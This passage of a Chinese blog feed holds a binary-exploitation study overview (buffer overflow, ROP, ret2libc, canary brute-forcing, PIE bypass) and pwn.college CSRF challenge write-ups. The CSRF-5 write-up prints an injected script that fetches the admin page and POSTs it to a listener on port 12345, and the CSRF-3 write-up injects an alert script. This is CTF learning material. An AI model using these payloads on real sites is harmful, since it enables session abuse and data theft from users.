    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>这一篇博客会把二进制利用的知识串起来，同时穿插pwn.college的题解，帮助自己理解和巩固。<br></p><span id="more"></span><p>内容会随着博主掌握的内容而更新，目前只到ROP部分（基本对应pwn.college上的intro&#x2F;Binary Exploitation以及program security 的ROP部分，堆还一点不会，哎哎……）<br><br>当然博主也是新手，有写错的地方勿怪<br><br>（声明：这篇博客所有记录默认是以64位架构为前提）</p><h1 id="基础部分随记"><a href="#基础部分随记" class="headerlink" title="基础部分随记"></a>基础部分随记</h1><h2 id="栈结构与函数调用"><a href="#栈结构与函数调用" class="headerlink" title="栈结构与函数调用"></a>栈结构与函数调用</h2><p>首先个人觉得做二进制的题目，最基本的是需要了解栈结构。<br><br><em><strong>栈的内存空间是从高地址向低地址增长，也就是说，每当有东西进栈，rsp将会-1，每当有东西出栈，rsp将会+1</strong></em><br><br>每个函数在调用的过程中会维护自己的一块在栈上的内存空间，被称为栈帧；<br><br><em><strong>函数在被调用时，首先会进行传参，但是否传入栈上，得看架构和参数个数；比如根据64位系统调用约定，前6个参数依次从rdi、rsi、rdx、rcx、r8、r9中读取，返回值保存在rax中。因此当参数个数超过6个，才通过栈传参（当然32位就是全用栈传参）</strong></em><br><em><strong>传参完成后会将下一条指令的地址压栈，即push rip，该地址被称为返回地址，这个动作由call指令自动完成</strong></em><br><br><em><strong>接下来会进入函数的所谓“序言”部分，即执行：压rbp入栈（push rbp）-&gt;把rsp的值赋给rbp（mov rbp,rsp）-&gt;rsp向低地址移动（sub rsp）</strong></em><br><br>（备注：后续回顾时重点理解函数被调用时的进栈流程，和leave ret对应起来理解）<br><br>此时，函数的栈帧已经形成，栈的最高处是调用者的rbp，最低处是rsp，函数运行时的局部变量存在栈帧的靠近低处<br><br>从rbp到局部变量，中间的内容需要具体分析，可能会有canary等数据<br><br>综上，可以画出栈的一个示意图如下：<br><br><img src="/../../../../../../photos/TogetherReview/Pwn/stack.png"><br>函数调用结束后，一般末尾会有leave和ret指令，这两条指令的等价形式如下：<br><br><em><strong>leave&#x3D;mov rsp,rbp;pop rbp，ret &#x3D;pop rip</strong></em><br><em><strong>此时可以发现，这些操作正好对应着函数序言，即可以理解为序言的反操作，这也就是为什么函数在调用过后还能回到原来的地方继续执行（返回地址实现），同时调用者的栈帧也能恢复（rbp的入栈出栈实现）</strong></em></p><h2 id="缓冲区溢出攻击原理"><a href="#缓冲区溢出攻击原理" class="headerlink" title="缓冲区溢出攻击原理"></a>缓冲区溢出攻击原理</h2><p>分析上述栈结构和函数调用过程，可以发现局部变量（用户输入的缓冲区）是在返回地址下方，而用户输入是不可控的，如果没有长度校验，可以通过构造过长的输入去覆盖返回地址，从而劫持函数的执行流<br><br>最后一个问题：返回地址应该覆盖为什么？根据目前做题经验，总结为以下2类：<br></p><h3 id="后门函数的地址"><a href="#后门函数的地址" class="headerlink" title="后门函数的地址"></a>后门函数的地址</h3><p>后门函数在题目中一般表现为可以读取、输出flag的函数，或者是直接调用system()等可以获得shell的函数<br><br>如果给的二进制文件中存在这类函数（通过逆向等手段发现），可以优先考虑覆盖返回地址为该函数的地址<br></p><h3 id="shellcode的起始地址"><a href="#shellcode的起始地址" class="headerlink" title="shellcode的起始地址"></a>shellcode的起始地址</h3><p>shellcode即可以帮助攻击者获取shell的代码，当二进制文件本身不存在后门函数的时候，就需要攻击者自己编写shellcode（或重用程序已有的代码段），并将其溢出到程序内存中（可以是栈、.bss段、数据段等）<br><br>具体实现方法为通过编写汇编语言代码，调用system、execve等函数开启shell。由于python强大的pwn包，现在可以直接使用该模块生成一般的shellcode<br></p><h2 id="溢出攻击的防御手段与克制方法"><a href="#溢出攻击的防御手段与克制方法" class="headerlink" title="溢出攻击的防御手段与克制方法"></a>溢出攻击的防御手段与克制方法</h2><p>目前博主在做题当中遇到的主要会阻碍我们的防御手段就是以下3种（后面遇到了别的再记录）：<br></p><h3 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a>NX保护</h3><p>NX保护即指定栈不可执行，该保护主要用于防御直接往栈上写shellcode的攻击方式<br><br>为了克制NX保护，需要采取被称为ROP的代码重用攻击<br></p><h3 id="克制NX保护——ROP攻击"><a href="#克制NX保护——ROP攻击" class="headerlink" title="克制NX保护——ROP攻击"></a>克制NX保护——ROP攻击</h3><p>当开启了NX保护，栈上的数据将不可以被视作代码来执行，因此直接写shellcode行不通<br><br>那该怎么办？很简单，自己写的不让执行，那就用程序本身有的，毕竟一个程序，总是有可以执行的代码块的，不然写出来干啥呢？<br><br>但是，另一个问题，想要getshell用到的代码块可能散布在程序各个地址，不会老老实实连续（指物理上的连续）放在一起，所以只覆盖一个返回地址肯定不行<br><br>此时，注意到ret指令实质是pop rip，因此，只要找的每一块指令碎片都以ret或者pop rip或者其他可以修改rip的指令结尾，那这个片段就可以使用<br><br>因此，可以把ROP看成一种特殊的shellcode，这段shellcode和传统意义上的不同，物理上并不是连续存储在内存中，而是分散开来的指令碎片<br><br>每块碎片就像链表的结点，结点之间通过ret（或其他修改rip的指令）连接，通过这种方式，实现逻辑上好像执行了一段连续的shellcode，而攻击者要做的，就是把第一块指令碎片（表头）的地址覆盖到返回地址<br><br><img src="/../../../../../../photos/TogetherReview/Pwn/ROP-example.png"><br>如上图，假设现在返回地址已经被覆盖为了第1块指令碎片的地址，并且函数下一条指令为ret<br><br>那么，一旦函数执行ret（即pop rip），会将rip的地址变成指令碎片的起始地址（即0x123，只是假设的地址，真正应该不会这么低），然后把rsp+1<br><br>因此rsp就会指向指令碎片2的地址，一旦碎片1执行完毕，由于最后一个指令是ret，同样会执行上述操作，从而rsp再指向碎片3的地址<br><br>……………………直到所有的指令碎片执行完毕，拿到shell<br><br>目前遇到的ROP题目大致分为两类：<br><br>第一是ret2text，即回到程序本身的代码段，该方法适用于程序自身的指令碎片比较丰富，有着大量可用的指令，如system、&#x2F;bin&#x2F;sh等，通过返回到这些指令的地址获得shell<br><br>第二是ret2libc，即回到libc中；因为一个动态链接程序（为减小可执行文件体积，现在大部分都是动态链接文件，如果遇到静态的，就又回到了第一种类型）在运行时会装载libc.so文件；<br><br>libc.so是一个共享文件（不准确的说，可以看成windows下的dll），这个文件里存储了大量的C库函数，因此这里面必定存在我们想要的system和”&#x2F;bin&#x2F;sh”字符串<br><br>但是，.so文件一定是PIE的，因此在ret2libc时，最关键的步骤是获取libc在装载时的基地址，最基本的思路是通过程序中调用的函数的got表泄露<br><br>再简单说一下got表和plt表以及Linux的延迟绑定机制<br><br>简单来说，程序在调用libc中的函数时，第一次调用时会解析该函数的真实地址并存储在got表里，后续第2次第3次调用时直接去got表拿地址，简单的示意图如下：<br><br>第一次调用时会进行如下流程<br><br><img src="/../../../../../../photos/TogetherReview/Pwn/lazy-binding-1.png"><br>之后每次调用则如下图所示<br><br><img src="/../../../../../../photos/TogetherReview/Pwn/lazy-binding-2.png"><br>因此，可以看出，只要泄露了某个函数的got表的地址，再减去其在libc里的偏移，即可得到其真实地址（只要给定libc版本，偏移就是确定的，可以通过readelf命令行工具或者python的pwn模块获取）<br><br>同时，从上面讨论可以看出，必须要泄露程序中调用的函数的got表，才能获得libc基址，因此个人常选择__libc_start_main函数，这是一个在启动main时必定会被调用的函数<br></p><h3 id="canary保护"><a href="#canary保护" class="headerlink" title="canary保护"></a>canary保护</h3><p>canary即在rbp的下方放置一个随机数，并在安全位置保存该随机数的副本，退栈时比对副本和读取到的随机数，如果不一样说明发生了溢出攻击<br></p><h3 id="克制canary保护"><a href="#克制canary保护" class="headerlink" title="克制canary保护"></a>克制canary保护</h3><p>第一种方法是直接泄露canary的值，该方法需要程序本身有输出内存中的值的功能，或者攻击者能调用输出函数输出内存值<br><br>另一种方法是爆破：canary的第一个字节一定是0x00，这是为了截断字符串读取，防止canary泄露而设计，但这种设计也为canary的爆破提供了方便<br><br>只需要从第一个字节0x00开始，逐个字节的尝试，如果猜测正确，程序会正常执行，否则会出现异常（如输出”stack smashing detected”），最坏情况尝试256*7次，如下图所示<br><br><img src="/../../../../../../photos/TogetherReview/Pwn/anti-canary.jpg"></p><h3 id="PIE保护"><a href="#PIE保护" class="headerlink" title="PIE保护"></a>PIE保护</h3><p>PIE全称为位置无关可执行文件，开启了这个保护的程序，每次运行时将被加载到不同的基地址，因此程序里所有的指令地址在运行前都无法确定<br><br>换句话说，通过objdump反汇编看到的指令地址、函数起始地址，都是偏移量，不能直接使用<br></p><h3 id="克制PIE保护"><a href="#克制PIE保护" class="headerlink" title="克制PIE保护"></a>克制PIE保护</h3><p>尽管存在PIE，但由于操作系统需要页对齐，即每页大小4096字节，而4096正好&#x3D;0x1000，因此返回地址的最后12位（或者说最后一个半字节是确定的）<br><br>由此，为了克制PIE，可以采取低字节部分覆盖的攻击方法，只覆盖最后两个字节，其中只有一个16位数不确定，因此尝试16次即可<br><br>综上，当实际做题时，首要步骤应该是使用checksec命令去检查程序的保护措施，如下图：<br><br><img src="/../../../../../../photos/TogetherReview/Pwn/checksec-example.png"><br>这个程序是保护全关，但是看到哪种保护开启了，其实也是变相在提示解题思路<br><br>比如看到NX就知道栈上写shellcode的方法肯定废了，应该要ROP，或者有后门函数？看到canary和PIE，想到要爆破，或者想办法泄露一个基地址？</p><h2 id="一些做题trick"><a href="#一些做题trick" class="headerlink" title="一些做题trick"></a>一些做题trick</h2><h3 id="ROP之栈跃迁"><a href="#ROP之栈跃迁" class="headerlink" title="ROP之栈跃迁"></a>ROP之栈跃迁</h3><p>待补充</p><h2 id="其他琐碎知识点"><a href="#其他琐碎知识点" class="headerlink" title="其他琐碎知识点"></a>其他琐碎知识点</h2><h3 id="C程序启动过程——重新认识main函数"><a href="#C程序启动过程——重新认识main函数" class="headerlink" title="C程序启动过程——重新认识main函数"></a>C程序启动过程——重新认识main函数</h3><p>做题时发现对程序的启动以及main函数的加载退出机制不是很了解，严重影响做题，遂做一下记录<br><br>首先，main并不是程序真正的起点，在main函数之前，需要由_start函数去调用__libc_start_main，_start并不是开发者写在代码里的一个函数，而是编译时生成<br><br>将任意一个ELF文件拖入IDA，可以看到_start函数内部的样子如图所示<br><br><img src="/../../../../../../photos/TogetherReview/Pwn/start.png"><br>接下来说一下__libc_start_main，这是一个libc动态连接库(.so文件，即shared object)中的函数，它才是真正完成启动程序，设置寄存器值，调用main这一系列任务的函数<br><br>通过将.so文件拖到IDA里，同样能看到__libc_start_main如图所示<br><br><img src="/../../../../../../photos/TogetherReview/Pwn/libc-start-main.png"><br>如上图，从0x2402D处开始，__libc_start_main在为main函数启动做一系列准备，最后，在call rax处真正启动main函数<br><br>接着梳理main函数的退出机制，即return 0;之后究竟做了什么<br><br>还是看到上图逆向libc.so的结果，可以在0x24083处看到这样的指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mov     edi, eax<br>call    <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><p>回想64位系统的调用约定和传参约定，这两条指令实际上说明，当main函数退出时，会把返回值（一般是0）作为exit的参数从rax传递给rdi。紧接着下一条指令调用exit<br></p><h1 id="题目实例"><a href="#题目实例" class="headerlink" title="题目实例"></a>题目实例</h1><h2 id="pwn-college基本例题"><a href="#pwn-college基本例题" class="headerlink" title="pwn.college基本例题"></a>pwn.college基本例题</h2><h3 id="劫持到后门函数"><a href="#劫持到后门函数" class="headerlink" title="劫持到后门函数"></a>劫持到后门函数</h3><p>具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/Control-Hijack/">pwn.college题解：Control-Hijack</a><br><br>（备注：可以通过该题目了解最基本的栈溢出该怎么利用，以及各种工具的基本使用）</p><h3 id="劫持到shellcode"><a href="#劫持到shellcode" class="headerlink" title="劫持到shellcode"></a>劫持到shellcode</h3><p>具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Intro-to-Cybersecurity/Pwn/Hijack-to-Shellcode/">pwn.college题解：Hijack-to-Shellcode</a></p><h3 id="基础ROP"><a href="#基础ROP" class="headerlink" title="基础ROP"></a>基础ROP</h3><p>1 ret2text：<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-3/">pwn.college题解：ROP-level3</a><br>2 ret2libc：<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-4/">pwn.college题解：ROP-level4</a></p><h3 id="克制PIE"><a href="#克制PIE" class="headerlink" title="克制PIE"></a>克制PIE</h3><p>具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/PIEs-hard/">pwn.college题解：PIEs-hard</a></p><h3 id="克制canary"><a href="#克制canary" class="headerlink" title="克制canary"></a>克制canary</h3><p>1 直接泄露方式：<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-13/">pwn.college题解：ROP-level-13</a><br><br>2 爆破方式：<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-14-and-15/">pwn.college题解：ROP-level-14-and-15</a></p><h2 id="一些trick"><a href="#一些trick" class="headerlink" title="一些trick"></a>一些trick</h2><h3 id="消除shellcode的零字节"><a href="#消除shellcode的零字节" class="headerlink" title="消除shellcode的零字节"></a>消除shellcode的零字节</h3><p>具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/NULL-Free-Shellcode/">pwn.college题解：NULL-Free-Shellcode</a></p><h3 id="绕过strlen长度限制——0x00字节填充"><a href="#绕过strlen长度限制——0x00字节填充" class="headerlink" title="绕过strlen长度限制——0x00字节填充"></a>绕过strlen长度限制——0x00字节填充</h3><p>具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/String-Lengths-hard/">pwn.college题解：String-Lengths-hard</a></p><h3 id="ROP之栈跃迁-1"><a href="#ROP之栈跃迁-1" class="headerlink" title="ROP之栈跃迁"></a>ROP之栈跃迁</h3><p>具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-9/">pwn.college题解：ROP-level-9</a></p><h2 id="其他刷题记录"><a href="#其他刷题记录" class="headerlink" title="其他刷题记录"></a>其他刷题记录</h2><h3 id="32位程序的ret2text"><a href="#32位程序的ret2text" class="headerlink" title="32位程序的ret2text"></a>32位程序的ret2text</h3><p>具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/BUUCTF-jarvisoj-level2/">pwn刷题记录：BUUCTF-jarvisoj_level2</a></p>]]></content>
    
    
    <categories>
      
      <category>串联梳理</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSRF-5</title>
    <link href="/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-5/"/>
    <url>/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-5/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>这一关将不允许通过Javascript获取cookie，因为服务端对cookie设置了HTTPonly属性，该设置仅允许通过http请求传送cookie值，因此XSS将无法再获得admin的cookie<br><br>但是依然可以通过CSRF伪造admin用户的请求以泄露flag</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>依然是admin账户下面有flag，而ephemeral依然接收一个msg查询字符串，所以思路就是利用这个msg把admin导向首页，再把请求体发给我们的服务器</p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>如下index.html：<br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSRF Attack<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> targetURL = <span class="hljs-string">&#x27;http://challenge.localhost/ephemeral?msg=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-string">&#x27;&lt;script&gt;fetch(&quot;http://challenge.localhost/&quot;).then(response=&gt;response.text()).then(flag=&gt;fetch(&quot;http://localhost:12345&quot;,&#123;method:&quot;POST&quot;,body:flag&#125;))&lt;\/script&gt;&#x27;</span>);</span><br><span class="language-javascript">       <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = targetURL;</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>依次启动&#x2F;server、python http.server和victim<br>然后还需要我们再去12345监听admin发回来的响应体，那里面就有flag</p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSRF-3</title>
    <link href="/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-3/"/>
    <url>/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-3/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>需要通过CSRF引起XSS，并且提示我们注意javascript标签的闭合问题</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>查看victim源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    WebDriverWait(browser, <span class="hljs-number">1</span>).until(EC.alert_is_present())<br><span class="hljs-keyword">except</span> TimeoutException:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failure: JavaScript alert did not trigger...&quot;</span>)<br>    sys.exit(<span class="hljs-number">3</span>)<br><span class="hljs-keyword">else</span>:<br>    browser.switch_to.alert.accept()<br>    <span class="hljs-keyword">if</span> browser.current_url.replace(<span class="hljs-string">&quot;:80&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).startswith(challenge_url.replace(<span class="hljs-string">&quot;:80&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Alert triggered! Your reward:&quot;</span>)<br>        <span class="hljs-built_in">print</span>(flag)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;It looks like the alert did not come from &#123;challenge_url&#125;/ephemeral?&quot;</span>)<br></code></pre></td></tr></table></figure><p>发现输出falg的逻辑是访问server的ephemeral路由，并检测是否有alert出现<br><br>回到server端查看该路由，可以看到有一个msg的查询字符串（即GET传参），因此存在admin账户的请求伪造，并触发admin账户执行相应的js代码的漏洞</p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>根据上述分析，只要我们可以把victim重定向到challenge.localhost&#x2F;ephemeral并在该页面执行js代码即可<br><br>故可以写出如下的页面：index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSRF Attack<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://challenge.localhost/ephemeral?msg=&lt;s&quot;</span>+<span class="hljs-string">&quot;cript&gt;alert(&#x27;PWNED&#x27;)&lt;\/script&gt;&quot;</span></span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>通过依次启动server、启动自己的服务（1337端口）、启动victim即可获得flag：<br><img src="/../../../../../../../photos/pwn.college/intro/Web/CSRF-3.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSRF-1</title>
    <link href="/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-1/"/>
    <url>/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-1/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>XSS注入JavaScript以导致受害者发起HTTP请求。 但是如果没有XSS怎么办？ 答案是直接“注入”HTTP请求。<br></p><span id="more"></span><p>web设计的目的是使许多不同的网站相互连接。 网站可以嵌入来自其他网站的图像，链接到其他网站，甚至重定向到其他网站。 所有这些灵活性意味着一些严重的安全风险，而且几乎没有任何措施可以防止恶意网站直接导致受害者访问者发出潜在的敏感请求，例如（在我们的例子中）将 GET 请求发送给 <a href="http://challenge.localhost/publish">http://challenge.localhost/publish</a> ！<br></p><p>这种类型的跨站点请求伪造被称为跨站请求伪造（Cross Site Request Forgery，简称CSRF）。<br></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先分析源码，这题其实存在XSS漏洞，但是admin不会访问&#x2F;challenge.localhost，因此没办法通过把js代码写到首页去骗admin重定向到publish路由<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge_get</span>():<br>    page = <span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;\nWelcome to pwnpost, now XSS-free (for admin, at least)!&lt;hr&gt;\n&quot;</span><br>    username = flask.session.get(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">if</span> username == <span class="hljs-string">&quot;admin&quot;</span>:<br>        page += <span class="hljs-string">&quot;&quot;&quot;&lt;b&gt;To prevent XSS, the admin does not view messages!&lt;/b&gt;&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>可以看到存在if username&#x3D;&#x3D;’admin’的额外校验，根据提示应该用CSRF；<br><br>接下来看一下victim源码：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">challenge_url = <span class="hljs-string">&quot;http://challenge.localhost:80/&quot;</span><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>).read().strip()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Visiting <span class="hljs-subst">&#123;challenge_url&#125;</span>&quot;</span>)<br>browser.get(challenge_url)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Logging in as admin...&quot;</span>)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Visiting the attacker&#x27;s website (http://hacker.localhost:1337/)...&quot;</span>)<br>browser.get(<span class="hljs-string">&quot;http://hacker.localhost:1337/&quot;</span>)<br>time.sleep(<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p>分析一下，主要分两个部分，第一个是请求challenge.localhost，并且以admin登录，接下来注意到第二部分会访问本地的1337端口；<br><br>因此只要我们在1337开一个web服务，把admin重定向到&#x2F;publish路由就可以了；<br><br>因此存在CSRF漏洞，可以从我们的“钓鱼网站”伪造admin在请求<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>综上，利用思路就是在1337开一个服务，等victim访问我们，然后再以guest身份登录challenge.localhost即可看到flag<br>开启服务有很多方法，题目里就提供了两个，一个最基础的nc，前面几题都用过，不再记录<br><br>另一个是python的http.server模块，个人感觉python的比nc方便，只要写一个简单的index.html就行；<br><br>因此写出如下的index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSRF Attack<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://challenge.localhost/publish&quot;</span></span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>综上，完整流程是：<br><br>首先启动&#x2F;challenge&#x2F;server<br><br>之后cd到保存有index.html的目录中并运行以下命令：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server 1337<br></code></pre></td></tr></table></figure><p>之后再运行&#x2F;challenge&#x2F;victim，最后刷新浏览器就可以了，也是成功拿到了flag<br><br><img src="/../../../../../../../photos/pwn.college/intro/Web/CSRF-1/CSRF-1.png"></p><h2 id="一点基础知识补充"><a href="#一点基础知识补充" class="headerlink" title="一点基础知识补充"></a>一点基础知识补充</h2><p>回看这个Wp，感觉缺了些基础知识的讲解，简单讲一下index.html怎么写出来的<br><br>其实主要是html里的这一句</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 